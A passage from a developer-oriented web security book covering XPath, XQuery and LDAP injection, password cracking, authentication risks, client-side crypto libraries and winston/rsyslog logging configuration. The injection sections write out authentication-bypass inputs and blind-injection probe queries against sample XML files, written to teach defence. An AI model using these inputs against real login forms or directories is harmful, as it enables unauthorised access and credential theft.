XPath injection is similar to generic injection when XPath incorporates untrusted data that has not been validated, filtered, and sanitised based on the execution context in question. This is discussed in the "[What is Sanitisation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation)" section of the Lack of Input Validation, Filtering and Sanitisation section of Identify Risks. The intended logic of the query can be modified, which allows an attacker to inject purposely malformed data into a website. This allows the attacker to make educated guesses based on what is returned, the data, and any error messages. The attacker can then build a picture of what the XML structure looks like. Similar to XML Injection, the attacker will usually carry out this discovery stage, followed by full exploitation if successful.

Although this attack technique is similar to SQLi, XPath has no provision for [commenting](https://www.owasp.org/index.php/Comment_Injection_Attack#Examples) out tails of expressions:

* MS SQL, MySQL and Oracle: `--`
* MySQL: `#`
* MS Access: `%00`

XPath is a standards-based language. Unlike SQL, its syntax is implementation independent, this allows attacks to be automated across many targets that accept user input to query XML documents.

Typically in SQL, certain commands and queries are run as specific users, utilising the principle of least privilege to be applied to any given command or query based on the user running it. In XPath, there is no notion of Access Control Lists (ACLs). This means that a query can [access every part](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)#Summary) of the XML document. For example, if user credentials are being stored in an XML document, they can be retrieved and allow the attacker to elevate their privileges to those of other users, perhaps even to an administrator if the administrators credentials are stored in the XML document.

Use the following XML document for examples:

{title="users.xml", linenos=off, lang="XML"}
    <?xml version="1.0" encoding="UTF-8"?>
    <Users>
       <User ID="1">
          <FirstName>John</FirstName>
          <LastName>Deer</LastName>
          <UserName>jdeer</UserName>
          <Password>3xp10it3d</Password>
          <Type>administrator</Type>
       </User>
       <User ID="2">
          <FirstName>Kim</FirstName>
          <LastName>Carter</LastName>
          <UserName>kimc</UserName>
          <Password>t03457</Password>
          <Type>user</Type>
       </User>
    </Users>

[Blind injection](https://www.owasp.org/index.php/Blind_XPath_Injection) is a technique that is used in many types of injection. A blind injection attack is used where the attacker does not know what the underlying query is. In the case of XPath, the attacker doesn't know what the XML document looks like, and/or the feedback from the application reveals little detail in terms of data or error messages. Often booleanised queries and/or XML Crawling are used to facilitate the blind injection attacks.

**Booleanised Queries** are those that return very granular true/false information based on very small amounts of data supplied by the attacker.

The following XPath query returns the first character of the first child node (no matter what it is called) of the first User:

{linenos=off, lang="XQuery"}
    substring((//User[1]/*[1]),1,1)

The following XPath query returns the length of the fourth element (no matter what it is called) of the first User:

{linenos=off, lang="XQuery"}
    string-length(//User[1]/*[4])

**XML Crawling** allows the attacker to get to know what the XML document structure looks like.

For example, the following reveals that the number of `Users` is 2:

{linenos=off, lang="XQuery"}
    count(//Users/*)

The following reveals that the length of the value at the fourth position of the child node (no matter what it is called) of the first `User` is in fact 9 characters long. Is the `Password` nine characters long? True.

{linenos=off, lang="XQuery"}
    string-length(//User[position()=1]/*[position()=4])=9

The following query confirms that the first character of the fourth child node (no matter what it is called) of the first `User` is, in fact, `3`:

{linenos=off, lang="XQuery"}
    substring((//User[1]/*[4]),1,1)="3"

Checkout the OWASP [XML Crawling](https://www.owasp.org/index.php/Blind_XPath_Injection#XML_Crawling) documentation for further details. The queries provided in OWASP documentation did not work for me, hence, why I have supplied ones that do.

Using booleanised queries can be very good for automated attacks, usually because many of these granular tests need to be performed. Because they are so small, an attacker can aggregate them, making them very versatile.

Continuing on, if our target application contains logic to retrieve the account type, once the user provides their username and password, and the legitimate administrator has entered their credentials, that logic may look similar to the following:

{linenos=off, lang="XQuery"}
    string(//User[UserName/text()='jdeer' and Password/text()='3xp10it3d']/Type/text())

If the application does not take the countermeasures discussed, and the attacker enters the following:

Username:  
`' or '1'='1`  
Password:  
`' or '1'='1`

then the above query will look more like the following:

{linenos=off, lang="XQuery"}
    string(//User[UserName/text()='' or '1'='1' and Password/text()='' or '1'='1']/Type/text())

Although the attacker has not supplied a valid `UserName` or `Password`, according to the XPath query, they are still authenticated, because the query will always evaluate to true. This is called an authentication bypass for obvious reasons. You may notice that this attack looks very similar to many other SQLi attacks.

The available XPath functions and XSLT-specific additions to XPath are [documented](https://developer.mozilla.org/en-US/docs/Web/XPath/Functions) at Mozilla Developer Network (MDN)

Technically, XPath is used to select parts of an XML document, it has no provision for updating. In saying that, command injection can be used to modify data that XPath returns. Standard language libraries usually provide functionality for modifying XML documents, along with the XML Data Modification Language ([DML](https://docs.microsoft.com/en-us/sql/t-sql/xml/xml-data-modification-language-xml-dml)), which we'll discuss in the next section.

#### XQuery Injection {#web-applications-identify-risks-xquery-injection}

XQuery, being a superset of XPath, suffers from the same vulnerabilities as XPath, plus the SQL-like `FOR`, `LET`, `WHERE`, `ORDER BY`, `RETURN` (FLWOR) expression abilities. As a result, the attack vectors are a combination of those discussed in [XPath Injection](#web-applications-identify-risks-xpath-injection) and [SQLi](#web-applications-identify-risks-sqli). The canonical example is provided below thanks to [projects.webappsec.org](http://projects.webappsec.org/w/page/13247006/XQuery%20Injection%7C):

{title="users.xml", linenos=off, lang="XML"}
    <?xml version="1.0" encoding="UTF-8"?>
    <userlist>
       <user category="group1">
          <uname>jdeer</uname>
          <fname>John</fname>
          <lname>Deer</lname>
          <status>active</status>
       </user>
       <user category="admins">
          <uname>kimc</uname>
          <fname>Kim</fname>
          <lname>Carter</lname>
          <status>active</status>
       </user>
       <user category="group2">
          <uname>bobm</uname>
          <fname>Bob</fname>
          <lname>Marley</lname>
          <status>deceased</status>
       </user>
       <user category="group1">
          <uname>MSmith</uname>
          <fname>Matthew</fname>
          <lname>Smith</lname>
          <status>terminated</status>
       </user>
    </userlist>

If the query to retrieve the user `bobm` was using a string literal from the users input (`bobm`), it may look similar to the following:

{linenos=off, lang="XQuery"}
    doc("users.xml")/userlist/user[uname="bobm"]

An attacker could exploit the query by providing:  
`something" or ""="` 

which would form the following query:

{linenos=off, lang="XQuery"}
    doc("users.xml")/userlist/user[uname="something" or ""=""]

which, upon execution would yield all of the `user`s.

Also, keep in mind that XQuery [has an extension](https://www.mssqltips.com/sqlservertip/2738/examples-of-using-xquery-to-update-xml-data-in-sql-server/) called the XML Data Modification Language ([DML](https://docs.microsoft.com/en-us/sql/t-sql/xml/xml-data-modification-language-xml-dml)), which is commonly used to update (`insert`, `delete` and `replace value of`) XML documents.

#### LDAP Injection {#web-applications-identify-risks-ldap-injection}

The same generic injection information is applicable to LDAP.

[Successful LDAP injection](https://www.owasp.org/index.php/LDAP_Injection_Prevention_Cheat_Sheet#Introduction) attacks could result in granting permissions to unauthorised queries and/or adding, deleting or modifying of entries in the LDAP tree. Because LDAP is used extensively for user authentication, this is a particularly viable area for attackers.

As per our discussion of the use of metacharacters in [XML Injection](#web-applications-identify-risks-xml-injection), LDAP search filter metacharacters [can be injected](https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)#Summary) into the dynamic parts of the queries, and thus executed by the application. 

LDAP uses [Polish notation](https://en.wikipedia.org/wiki/Polish_notation) (PN), or normal Polish notation (NPN), or simply prefix notation, which has the distinguishing feature of placing operators to the left of their operands.

One of the canonical examples is noted when a web application takes user credentials and verifies their authenticity. If successful, the user is then authenticated, and granted access to specific resources.

The LDAP filter used to check whether the supplied username and password of a user is correct might look similar to the following:

{linenos=off}
    string ldapLoginQuery = "(&(uId="jdeer")(userPassword="3xp10it3d"))";

With user input:

{title="username", linenos=off}
    jdeer")(&))("

and:

{title="password", linenos=off}
    incorrectpass

the search filter would look similar to the following:

{linenos=off}
    string ldapLoginQuery = "(&(uId="jdeer")(&))("")(userPassword="incorrectpass"))";

The `(&)` we used, that did not contain any embedded filters, is called the [LDAP true filter](https://docs.oracle.com/cd/E19476-01/821-0510/def-and-search-filter.html), and will always match any target entry. This allows the attacker to compare a valid `uid` with `true`; the attacker can subsequently use any password as [only the first filter](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf) is processed by the LDAP server.

### Captcha
![](images/ThreatTags/easy-verywidespread-easy-low.png)

Lack of captchas are a risk, but so are captchas themselves.

What is the problem here? What are we trying to stop?

Perhaps it's bots submissions. Whatever it is, whether it's advertising, creating an unfair advantage over real humans, link creation in attempt to increase SEO, or malicious code insertion, you are more than likely not interested in accepting it.

We do not want to block people submitting genuinely safe input. If a person is prepared to fill out a form manually, even if it is spam, then a person can view the submission and very quickly delete the validated, filtered and possibly sanitised message.

### Management of Application Secrets {#web-applications-identify-risks-management-of-application-secrets}

Also consider reviewing the [Storage of Secrets](#cloud-identify-risks-storage-of-secrets) subsections in the Cloud chapter.

* Passwords and other secrets for datastores, syslog servers, monitoring services, email accounts, and so on, can be useful to an attacker to compromise datastores, obtain further secrets from email accounts, file servers, system logs, services being monitored, etc. These may even provide credentials to continue moving through the network compromising other machines.
* Passwords and/or their hashes traveling over the network.

#### Datastore Compromise {#web-applications-identify-risks-management-of-application-secrets-data-store-compromise}
![](images/ThreatTags/difficult-widespread-average-moderate.png)

I have tagged this as moderate because, if you take the countermeasures, it doesn't have to be a disaster.

The New Zealand Intelligence Service [told](http://www.stuff.co.nz/national/politics/73704551/homegrown-threats-more-serious-says-spy-boss-rebecca-kitteridge) New Zealand's previous Prime Minister John Key that one of the 6 top threats facing New Zealand is a "_Cyber attack or loss of information and data, which poses financial and reputational risks._"

There are numerous examples of datastore compromise that happen on a daily basis. If only organisations put in place what I outlined in the countermeasures section, then millions of users would not have their identifies stolen. Sadly the advice security expets suggest is rarely followed. What happened in the Ashley Madison debacle is a very good example, as Ashley Madison's entire business relied on its commitment to keep its clients (37 million of them) data secret, and provide their clients discretion and anonymity. 

"_Before the breach, the company boasted about airtight data security but ironically, still proudly displays a graphic with the phrase “trusted security award” on its homepage_"

"_We worked hard to make a fully undetectable attack, then got in and found nothing to bypass.... Nobody was watching. No security. Only thing was segmented network. You could use Pass1234 from the internet to VPN to root on all servers._”

"_Any CEO who isn’t vigilantly protecting his or her company’s assets with systems designed to track user behavior and identify malicious activity is acting negligently and putting the entire organization at risk. And as we’ve seen in the case of Ashley Madison, leadership all the way up to the CEO may very well be forced out when security isn’t prioritized as a core tenet of an organization._"

> Dark Reading

Another notable datastore compromise is [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) where 6.5 million user accounts where compromised and 95% of the users passwords cracked within days. Why so fast? Because they used simple hashing, specifically SHA-1. Another is when [EBay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) were hacked affecting their 145 million active buyers. Many others come to light regularly.

Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is? Consider checking new user credentials against a list of the most frequently used and insecure passwords collected. I have discussed Password Lists in the Tooling Setup chapter. You could also use wordlists targeting the most commonly used passwords, or create an algorithm that works out what an easy to guess password looks like, and inform the user that their password would be easy to guess by an attacker.

#### Cracking {#web-applications-identify-risks-management-of-application-secrets-cracking}

Password profiling was covered in the People chapter where we talked about how we essentially make good guesses, both manually and by using profiling tools around the enduser's passwords, and then feed the short-list to a brute forcing tool. Here we already have the password hashes, we just need to find the source passwords that created the hashes. This is where cracking comes in.

When an attacker acquires a datastore or domain controller dump of hashed passwords, they will need to crack the hashes in order to acquire the passwords. This works when an attacker finds or creates a suitable wordlist of possible passwords. The tool used in attempting to create a hash of each of these passwords is based on the hashing algorithm used on the dump of hashes. Then compare each dumped hash with the hashes just created and when a match is found, we know that the password in our wordlist was used to create the hash, and what matches the dumped hash is in fact a legitimate password.

A smaller wordlist takes less time to create the hashes, as this is often an offline attack. A larger wordlist is often preferred over the smaller one, as a greater number of hashes is generated, increasing the likelihood of a greater number of matches.

As part of the hands on hack in the [SQLi](#web-applications-identify-risks-sqli) section, we obtained password hashes via SQL injection from the target web application DVWA (part of the OWASP Broken Web Application suite (VM)). We witnessed how an attacker could obtain the passwords from the hashed values retrieved from the database.

### Lack of Authentication, Authorisation and Session Management {#web-applications-identify-risks-lack-of-authentication-authorisation-session-management}
![](images/ThreatTags/average-common-average-severe.png)

This is also brought to light by the OWASP Top 10 risks "[_No. 2 Broken Authentication and Session Management_](https://www.owasp.org/index.php/Top_10_2017-A2-Broken_Authentication_and_Session_Management)".

In this category of attacks, your attacker could be someone known by you, or someone you do not know. It may be somebody already with an account, perhaps an insider maybe looking to take the next step such as privilege escalation, or just an alteration giving them access to different resources by way of acquiring other accounts. Some possible attack vectors could be:

* Password acquisition: by way of datastore theft (off-line attack) or poor password hashing strategies (susceptible to off-line and on-line attacks), discussed in the Countermeasures section but in more depth in the Management of Application Secrets sections
* Passwords or Session Ids traveling over unsecured channels susceptible to Man In the Middle (MItM) attacks, discussed in the Countermeasures section. Also refer to the TLS Downgrade sections of the Network chapter
* Buggy Session Management, Session Ids exposed in URLs
* Faulty logout (not invalidating authentication tokens)
* Faulty remember me functionality
* Long session timeouts can exacerbate other weak areas of defence
* Secret questions
* Updating account details

In the Countermeasures section I will go through some mature and well tested libraries, plus other technologies, and details around making them fit into a specific business architecture.

Consider what data could be exposed from any of the accounts and how this could be used to gain a foot hold to launch further alternative attacks. Each step allows the attacker to move closer to their ultimate target, the ultimate target being something hopefully discussed during the Asset Identification phase. Conduct another iteration of it as you learn and think of additional possible targeted assets.

Often the line between the following two concepts gets blurred, sometimes because where one starts and one ends is often not absolute or clear, and sometimes intentionally. Neither help newcomers, and even those used to working with the concepts struggle to come to terms with which is which and what the responsibilities of each include.

#### What is Authentication

Authentication is the process of determining whether an entity (be it person or something else) is who or what it claims to be.

Being authenticated means the entity is known to be who or what he/she/it claims to be.

#### What is Authorisation

Authorisation is the process of verifying that an entity (usually making a request, be it person or something else) has the right to a particular resource, or to carry out an action, before granting the permission requested.

Being authorised means the entity has the power or right to certain privileges.

&nbsp;

**Don't build your own** authentication, authorisation or session management system unless it's your core business. It is too easy to get things wrong, as it only takes one defect to become compromised. Leave it to those who are experienced, or have it as part of their core business and have already worked through the defects.

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-identify-risks-cryptography-on-the-client}

![](images/ThreatTags/average-widespread-average-severe.png)

I see things that developers get into trouble with due to:

1. Lack of understanding of what the tool is, where and how it should be used
2. Use of low level primitives with little to no knowledge of which are the most suitable for what purposes, how to make them work together, and how to use and configure them so as to not introduce security defects. This is usually due to not understanding how the given primitive is designed and its purpose of use
3. Many libraries have either:
    1. Too many options which creates confusion for the developers regarding what to use for which purpose and where the options they do have are not the best for their intended purpose
    2. The creators may be developers, but are not cryptographers

There are so many use cases within the wider cryptography topic. There is no substitute for learning about your options, which to use in any given situation, and how to use them.

JavaScript crypto is wrought with problems.

For example, there is nothing safe about having JavaScript in the browser store, read or manage an entropy pool. This improves marginally with the Web Cryptography APIs (discussed in the [Countermeasures](#web-applications-countermeasures-cryptography-on-the-client) section) `window.crypto.getRandomValues()`. 

Little trust should be placed in the browser, as it generally fails to manage attacks due to the complexities discussed in both the [Risks](#web-applications-identify-risks-lack-of-input-validation-and-sanitisation) and [Countermeasures](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation) sections of "Lack of Input Validation, Filtering and Sanitisation". The browser has enough trouble getting all the technologies to work together, and inside of each other, let alone stopping malicious code fragments. As most web developers long ago learned, the browser is purposely designed to make even syntactically incorrect code work correctly.

The browser was designed to download and run potentially malicious, untrusted code from arbitrary locations on the fly. The browser in most cases doesn't know what malicious code is, and often the first payload is not malicious, but simply fetches other code that may fetch other code that may become malicious.

JavaScript engines are constantly changing, though developers, who are still expecting and relying on the implementation details of the execution environments to stay somewhat stable, will be constantly let down.

Web development is hard, though web security is harder still.

The following is a list of the best JavaScript crypto libraries we have available to us. I purposely left many out, as I don't want to muddy the water and add more lower quality options:

* **Stanford JavaScript Crypto Library (SJCL)**
  * Home page: [http://bitwiseshiftleft.github.io/sjcl/](http://bitwiseshiftleft.github.io/sjcl/) The default key stretching factor appears to be 1000. This should probably be adaptive to match the advances in hardware technology, as discussed under the [MembershipReboot](#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot) section. 
  * SJCL demo page: [http://bitwiseshiftleft.github.io/sjcl/demo/](http://bitwiseshiftleft.github.io/sjcl/demo/) which helps to explain some of the creators reasoning.
  * Source Code: [https://github.com/bitwiseshiftleft/sjcl/](https://github.com/bitwiseshiftleft/sjcl/)
  * NPM package: [https://www.npmjs.com/package/sjcl](https://www.npmjs.com/package/sjcl). Yes the download count is way less than Forge, but SJCL is first in my list for a reason. SJCL provides minimal options of algorithms and cipher modes, etc. Just the best, to help ease the burden of having to research many algorithms and cipher modes to find out which are now broken.  
    
  It's really good to see how SJCL is pushing consumers down the right path and issuing warnings regarding primitives that have issues, the [warning](https://github.com/bitwiseshiftleft/sjcl/wiki/Directly-Using-Ciphers) against using CBC, as an example. I discuss this further in the [risks that solution causes](#web-applications-risks-that-solution-causes-cryptography-on-the-client) section.
  
  Other than the [countermeasure](#web-applications-countermeasures-cryptography-on-the-client-web-cryptography-api), this is probably the best offering we have for crypto in the browser. It has sensible defaults, good warnings, and not too many options to understand in order to make good choices. This is one of those libraries that guides the developer down the right path.
  
  SJCL encrypts your plain text using the AES block cypher with a choice of cipher modes CCM or OCB2. AES is the industry-standard block-cipher for this purpose, one of the better choices for crypto in the browser, if it must be done. AES comes in three forms, 128 bit (very efficient), 192 bit, and 256 bit. SJCL has provided two modes of operation for use with AES in the following two [Authenticated Encryption with Associated Data (AEAD)](https://en.wikipedia.org/wiki/Authenticated_encryption) ciphers:
  
  1. AES-CCM. Counter with CBC-MAC (CCM) is a mode of operation for cryptographic block ciphers of 128 bits in length. It is an authenticated encryption algorithm designed to provide both authentication and confidentiality
  2. AES-OCB2. [Offset CodeBook (OCB)](https://en.wikipedia.org/wiki/OCB_mode) is also a mode of operation for cryptographic block ciphers of 128 bits in length. OCB2 is an authenticated encryption algorithm designed to provide both authentication and confidentiality. OCB1 didn't allow associated data to be included with the message. Integrity verification is now part of the decryption step with OCB2. GCM is similar to OCB, but GCM and CCM doesn't have any patents. Although exemptions have been granted, so that OCB can be used in software licensed under the GNU General Public License  
  
  * Uses PBKDF2 for One way hashing of passwords. More details around password hashing in the [Datastore Compromise](#web-applications-countermeasures-data-store-compromise) section.
* **Forge**
  * Source Code: [https://github.com/digitalbazaar/forge](https://github.com/digitalbazaar/forge)
  * NPM package: [https://www.npmjs.com/package/node-forge](https://www.npmjs.com/package/node-forge)  
  * Forge is a JavaScript library that provides a native implementation of TLS and is a large toolbox containing utilities and implementations (although many considered insecure now) for:
    * Transports: TLS, HTTP, SSH, XHR, Sockets
    * Ciphers: AES, 3DES, DES and RC2
    * Cipher Modes:  GCM, ECB, CBC, CFB, OFB, and CTR
    * Asymmetric cryptography: RSA, RSA-KEM, X.509, PKCS#5, PKCS#7, PKCS#8, PKCS#10, PKCS#12 and ASN.1
    * Message Digests: SHA1, SHA256, SHA384, SHA512, MD5 and HMAC
    * Utilities: Prime number generator, pseudo-random number generator
* **OpenPGPjs**
  * Home page: [https://openpgpjs.org/](https://openpgpjs.org/)
  * Source Code: [https://github.com/openpgpjs/openpgpjs](https://github.com/openpgpjs/openpgpjs)
* **SecurityDriven.Inferno**  
  Although it is not a client side library, it is still worth mentioning, because it's opinionated and from the looks of it, Stan Drapkin is making good decisions and focussing on the best of bread components.
  * Source Code: [https://github.com/sdrapkin/SecurityDriven.Inferno](https://github.com/sdrapkin/SecurityDriven.Inferno)
  * Documentaion: [http://securitydriven.net/inferno/](http://securitydriven.net/inferno/)
  * NuGet package: [https://www.nuget.org/packages/Inferno/](https://www.nuget.org/packages/Inferno/)

### Consuming Free and Open Source {#web-applications-identify-risks-consuming-free-and-open-source}
![](images/ThreatTags/average-common-average-moderate.png)

here, [A9 (Using Components with Known Vulnerabilities)](https://www.owasp.org/index.php/Top_10_2017-A9-Using_Components_with_Known_Vulnerabilities) of the 2017 OWASP Top 10 applies.

We are consuming far more free and open source libraries than we ever have before. Most of the code we are pulling into our projects is never intentionally used, but still adds a surface area for attack. Most of it:

* Is not thoroughly tested for what it should and should not do. We are often relying on developers to not introduce defects. As I have discussed in the "Code Review" section of the Process and Practises chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com), most developers focus more on building than breaking, and do not see the defects they are introducing
* Is not reviewed or evaluated. Many of the packages we consume are created by solo developers who focus on creating and have little focus on how their creations can be exploited. Even some teams who have a security champion aren't doing a lot better
* Is created by amateurs who include vulnerabilities. Anyone can write code and publish to an open source repository. A lot of this code ends up in our package management repositories which we consume
* Does not undergo the same requirement analysis, scope definition, acceptance criteria, test conditions, and sign off by a development team and product owner, that our commercial software more often does

There are some very sobering statistics, which Adrian Colyer also details in his blog post "[the morning paper](https://blog.acolyer.org/2017/03/07/thou-shalt-not-depend-on-me-analysing-the-use-of-outdated-javascript-libraries-on-the-web/)", on how many defective libraries we are depending on. We are all trying to get things done faster which, in many cases, means consuming someone else's work rather than writing our own code.

Many vulnerabilities hide in these external dependencies. It is not just one attack vector any more, there is opportunity for many vulnerabilities to be exploited. If you do not find and deal with them, I can assure you, someone else will.

Running any type of scripts from non-local sources, without first downloading and inspecting them, and checking for known vulnerabilities, has the potential to cause massive damage. For example, it can lead to the destruction or modification of your systems and any other that may be reachable, allow sensitive information to be sent to an attacker, and many other types of other malicious activity.

### Insufficient Attack Protection
![](images/ThreatTags/easy-common-average-moderate.png)

There is a good example of what the Insecure Direct Object References risk looks like in the [NodeGoat](https://github.com/OWASP/NodeGoat/) web application. Check out the [tutorial](https://nodegoat.herokuapp.com/tutorial/a4), along with the video of how the attack is played out, also the sample code and recommendations on how to fix.

#### Lack of Active Automated Prevention

Web applications are often attacked with unusual requests.

Attackers probe for many types of weaknesses within the application. When they think they have found a flaw, they attempt to learn from this and refine their attack technique.

Attackers often have budgets, just like application developers/defenders. As they get closer to depleting their budget without gaining a foothold, the more impulsive they get, and start making more noise. Mistakes then creep into their techniques, which makes it even more obvious that their probes are of a malicious nature.

## 3. SSM Countermeasures

Every decision made throughout a project needs to factor in security. As with other non-functional requirements, retrofitting means undoing what you've already done and rebuilding. The mindset of going back later and bolting on security does not work.

Often I hear people say "well ... we haven't been hacked so far". This shows a lack of understanding. My response usually is: "Not that you're aware of". Many of the most successful attacks go unnoticed. Even if you or your organisation haven't been compromised, businesses are changing all the time, along with attack surfaces and assets. It's a matter of when, not if.

One of the additional resources useful at this stage is the [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008).

### Lack of Visibility {#web-applications-countermeasures-lack-of-visibility}

Refer to the ["Lack of Visibility"](#vps-countermeasures-lack-of-visibility) section in the VPS chapter where I discuss a number of tried and true solutions. Much of what we discuss here will also make use of it. As an example, logging and monitoring depend on components being set-up from the VPS chapter's Countermeasures sections within the Lack of Visibility sections.

As Bruce Schneier said: "_Detection works where prevention fails and detection is of no use without response_". This leads us to application logging.

With good visibility we can see both anticipated and unanticipated exploitation of vulnerabilities as they occur and should be able to go back and review/audit the events. Even so, you are still going to need someone engaged enough (discussed in the People chapter of Fascicle 0) to be reviewing logs and alerts.

#### Insufficient Logging {#web-applications-countermeasures-lack-of-visibility-insufficient-logging}
![](images/ThreatTags/PreventionAVERAGE.png)


When it comes to logging in NodeJS, you can't really improve on winston. It has a lot of functionality, and what it does not have is either provided by extensions, or you can create your own. It is fully featured, reliable and easy to configure, like NLog in the .NET world.

I have also looked at `express-winston`, but could not determine why it is needed.

{title="package.json", linenos=off, lang=JavaScript}
    {
       ...
       "dependencies": {
          ...,
          "config": "^1.15.0",
          "express": "^4.13.3",
          "morgan": "^1.6.1",
          "//": "nodemailer not strictly necessary for this example,",
          "//": "but used later under the node-config section.",
          "nodemailer": "^1.4.0",
          "//": "What we use for logging.",
          "winston": "^1.0.1",          
          "winston-email": "0.0.10",
          "winston-syslog-posix": "^0.1.5",
          ...
       }
    }

[`winston-email`](https://www.npmjs.com/package/winston-email) also depends on [`nodemailer`](https://www.npmjs.com/package/nodemailer).

##### Opening a UDP port

A lot of people seem to be using [`winston-syslog`](https://www.npmjs.com/package/winston-syslog), simply because `winston-syslog` is the first package that works well for winston and syslog.

If taking this route, you will need the following in your `/etc/rsyslog.conf`:

{title="/etc/rsyslog.conf", linenos=off, lang=Bash}
    $ModLoad imudp
    # Listen on all network addresses. This is the default.
    $UDPServerAddress 0.0.0.0
    # Listen on localhost.
    $UDPServerAddress 127.0.0.1
    $UDPServerRun 514
    # Or the new style configuration.
    Address <IP>
    Port <port>
    # Logging for your app.
    local0.* /var/log/yourapp.log

I also looked at both `winston-rsyslog2` and `winston-syslogudp`, but they did not measure up for me.

If you do not need to push syslog events to another machine, then it does not make much sense to push through a local network interface when you can use your posix syscalls, as they are faster and safer. Line 7 below shows the open port.

{title="nmap with winston-syslog", linenos=on}
    root@kali:~# nmap -p514 -sU -sV <target IP> --reason

    Starting Nmap 6.47 ( http://nmap.org )
    Nmap scan report for kali (<target IP>)
    Host is up, received arp-response (0.0015s latency).
    PORT    STATE         SERVICE REASON      VERSION
    514/udp open|filtered syslog  no-response
    MAC Address: 34:25:C9:96:AC:E0 (My Computer)

##### Using Posix

The [`winston-syslog-posix`](https://www.npmjs.com/package/winston-syslog-posix) package was inspired by [blargh](http://tmont.com/blargh/2013/12/writing-to-the-syslog-with-winston). `winston-syslog-posix` uses [`node-posix`](https://www.npmjs.com/package/posix).

If taking this route, you will need the following in your `/etc/rsyslog.conf`, instead of the above. You will still be able to push logs offsite, as discussed in the VPS chapter under the [Logging and Alerting](#vps-countermeasures-lack-of-visibility-logging-and-alerting) section in Countermeasures:

{title="/etc/rsyslog.conf", linenos=off, lang=Bash}    
    # Logging for your app.
    local0.* /var/log/yourapp.log

Now you can see on line 7 below that the syslog port is no longer open:

{title="nmap with winston-syslog-posix", linenos=on}
    root@kali:~# nmap -p514 -sU -sV <target IP> --reason

    Starting Nmap 6.47 ( http://nmap.org )
    Nmap scan report for kali (<target IP>)
    Host is up, received arp-response (0.0014s latency).
    PORT    STATE  SERVICE REASON       VERSION
    514/udp closed syslog  port-unreach
    MAC Address: 34:25:C9:96:AC:E0 (My Computer)

&nbsp;

Your logging configuration should not be in the application startup file, it should be in the configuration files. This is discussed further under the ["Store Configuration in Configuration files"](#web-applications-countermeasures-management-of-application-secrets-store-configuration) section.

Notice the syslog transport in the configuration below starting on line 39. 

{title="default.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {      
          colours: {
             debug: 'white',
             info: 'green',            
             notice: 'blue',
             warning: 'yellow',
             error: 'yellow',
             crit: 'red',
             alert: 'red',
             emerg: 'red'
          },
          // Syslog compatible protocol severities.       
          levels: {
             debug: 0,
             info: 1,
             notice: 2,
             warning: 3,
             error: 4,
             crit: 5,
             alert: 6,   
             emerg: 7   
          },
          consoleTransportOptions: {
             level: 'debug',
             handleExceptions: true,
             json: false,
             colorize: true
          },
          fileTransportOptions: {
             level: 'debug',
             filename: './yourapp.log',         
             handleExceptions: true,
             json: true,
             maxsize: 5242880, //5MB
             maxFiles: 5,
             colorize: false
          },
          syslogPosixTransportOptions: {
             handleExceptions: true,
             level: 'debug',
             identity: 'yourapp_winston'
             //facility: 'local0' // default
                // /etc/rsyslog.conf also needs: local0.* /var/log/yourapp.log
                // If non posix syslog is used, then /etc/rsyslog.conf or one
                // of the files in /etc/rsyslog.d/ also needs the following
                // two settings:
                // $ModLoad imudp // Load the udp module.
                // $UDPServerRun 514 // Open the standard syslog port.
                // $UDPServerAddress 127.0.0.1 // Interface to bind to.
          },
          emailTransportOptions: {
             handleExceptions: true,
             level: 'crit',
             from: 'yourusername_alerts@fastmail.com',
             to: 'yourusername_alerts@fastmail.com',
             service: 'FastMail',
             auth: {
                user: "yourusername_alerts",
                pass: null // App specific password.
             },
             tags: ['yourapp']      
          }
       }   
    }

I have chosen to not use syslog here in the development environment. You can see this on line 3 below. If you want to test syslog in development, you can either remove the logger object override from the `devbox1-development.js` file or modify it to be similar to the above. Then add one line to the `/etc/rsyslog.conf` file to turn on, as mentioned in a comment above in the `default.js` config file on line 44.

{title="devbox1-development.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {
          syslogPosixTransportOptions: null
       }
    }

In production, we log to syslog. As such, we do not need the file transport you can see the configured starting on line 30 above in the `default.js` configuration file, so we set it to null as seen on line 6 below in the `prodbox-production.js` file.

I go into more depth about how we handle syslogs in the VPS chapter under the [Logging and Alerting](#vps-countermeasures-lack-of-visibility-logging-and-alerting) section, where all of our logs are streamed to an offsite syslog server. This provides easy aggregation of all system logs into one user interface that DevOpps can watch on their monitoring panels in realtime and easily audit past events. This provides excellent visibility as a layer of defence.

There are also some other [options](http://help.papertrailapp.com/kb/configuration/configuring-centralized-logging-from-nodejs-apps/) for those using Papertrail as their offsite syslog and aggregation PaaS, but the solutions were not as clean as simply logging to local syslog from your applications, and then sending offsite from there. Again, this is discussed in more depth in the "Logging and Alerting" section in the VPS chapter.

{title="prodbox-production.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {
          consoleTransportOptions: {
             level: {},
          },
          fileTransportOptions: null,
          syslogPosixTransportOptions: {
             handleExceptions: true,
             level: 'info',
             identity: 'yourapp_winston'
          }
       }
    }

{title="local.js", linenos=off, lang=JavaScript}
    // Build creates this file.
    module.exports = {
       logger: {
          emailTransportOptions: {
             auth: {
                pass: 'Z-o?(7GnCQsnrx/!-G=LP]-ib' // App specific password.
             }
          }
       }
    }

The `logger.js` file wraps and hides extra features and transports applied to the logging package we are consuming.

{title="logger.js", linenos=off, lang=JavaScript}
    var winston = require('winston');
    var loggerConfig = require('config').logger;
    require('winston-syslog-posix').SyslogPosix;
    require('winston-email').Email;

    winston.emitErrs = true;

    var logger = new winston.Logger({
       // Alternatively: set to winston.config.syslog.levels
       exitOnError: false,
